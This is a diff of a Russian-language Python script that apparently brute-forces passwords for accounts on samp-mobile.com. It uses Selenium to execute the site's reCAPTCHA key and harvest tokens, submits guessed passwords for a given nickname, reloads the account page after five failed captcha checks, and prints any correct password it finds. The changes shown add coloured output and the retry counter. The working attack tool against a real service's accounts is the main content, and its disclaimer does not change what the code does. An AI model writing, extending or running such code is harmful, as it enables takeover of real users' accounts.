@@ -7,6 +7,7 @@ import os
 import argparse
 
 from selenium import webdriver
+from colorama import init, Fore, Back, Style
 
 
 # TODO: запуск веб сервера для отображения информации о процессе
@@ -16,6 +17,8 @@ async def mainAsync():
 	userName.add_argument('--nickname', help='set nickname', required=True)
 	userName = userName.parse_args()
 	userName = userName.nickname
+
+	init()
 
 	print('Разработчик не несет ответсвенности за неправомерное использование данной программы')
 
@@ -47,12 +50,19 @@ async def mainAsync():
 		except:
 			workSpeed = 0
 
+		attempt = 0
+
 		while True:
 			# TODO: получение токена напрямую через логи браузера
 			driver.execute_script("grecaptcha.ready(function() {grecaptcha.execute('6LfhuPcUAAAAAPTrbOFLnwQMXDbkTrwDeZ6xodrO', {action: 'homepage'}).then(function(token) {document.getElementById('g-recaptcha-response').value=token;});});")
 			g_recaptcha_response = driver.find_element_by_id('g-recaptcha-response')
 			g_recaptcha_response = g_recaptcha_response.get_attribute('value')
 			if not g_recaptcha_response:
+				if os.name == 'nt':
+					os.system('cls')
+				else:
+					os.system('clear')
+				print(f'{Back.YELLOW}{Fore.BLACK}Низкая скорость соединения{Style.RESET_ALL}')
 				continue
 			data = {
 				"user_name" : userName,
@@ -66,15 +76,19 @@ async def mainAsync():
 			message = response['message']
 			# WTF
 			if message == 'Вы не проходите проверку от Google Recaptcha.':
+				attempt = attempt + 1
+				if attempt == 5:
+					driver.get('https://samp-mobile.com/account/')
 				continue
 			else:
+				attempt = 0
 				# TODO: запись информации о процессе в файл
 				if status == 'ok':
 					if os.name == 'nt':
 						os.system('cls')
 					else:
 						os.system('clear')
-					print(f'Верный пароль: {userPassword}\nВремя: {int(workTime)}')
+					print(f'{Back.GREEN}{Fore.BLACK}Верный пароль: {userPassword}\nВремя: {int(workTime)}{Style.RESET_ALL}')
 					input()
 					exit()
 				else:
@@ -89,7 +103,7 @@ async def mainAsync():
 		os.system('cls')
 	else:
 		os.system('clear')
-	print('Пароль не найден')
+	print(f'{Back.RED}{Fore.BLACK}Пароль не найден{Style.RESET_ALL}')
 	input()
 	exit()
 
